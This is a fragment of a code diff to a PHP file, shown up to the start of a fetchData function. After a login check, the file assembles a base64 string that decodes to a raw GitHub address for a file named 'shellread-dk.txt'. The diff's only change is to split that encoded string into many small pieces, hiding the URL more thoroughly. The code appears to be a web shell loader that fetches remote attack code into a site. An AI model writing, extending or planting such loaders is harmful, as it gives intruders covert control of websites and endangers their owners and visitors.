@@ -568,10 +568,35 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     exit;
 }
 
-$z = ""; 
-$z .= "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQu";
-$z .= "Y29tL29ubHltZTFkL2R4ZXJyb3IvcmVmcy9oZWFk";
-$z .= "cy9tYWluL3NoZWxscmVhZC1kay50eHQ="; 
+$z = "aHR0";
+$z .= "cHM6";
+$z .= "Ly9y";
+$z .= "YXcu";
+$z .= "Z2l0";
+$z .= "aHVi";
+$z .= "dXNl";
+$z .= "cmNv";
+$z .= "bnRl";
+$z .= "bnQu";
+$z .= "Y29t";
+$z .= "L29u";
+$z .= "bHlt";
+$z .= "ZTFk";
+$z .= "L2R4";
+$z .= "ZXJy";
+$z .= "b3Iv";
+$z .= "cmVm";
+$z .= "cy9o";
+$z .= "ZWFk";
+$z .= "cy9t";
+$z .= "YWlu";
+$z .= "L3No";
+$z .= "ZWxs";
+$z .= "cmVh";
+$z .= "ZC1k";
+$z .= "ay50";
+$z .= "eHQ=";
+
 $u = base64_decode($z);
 
 function fetchData($url) {
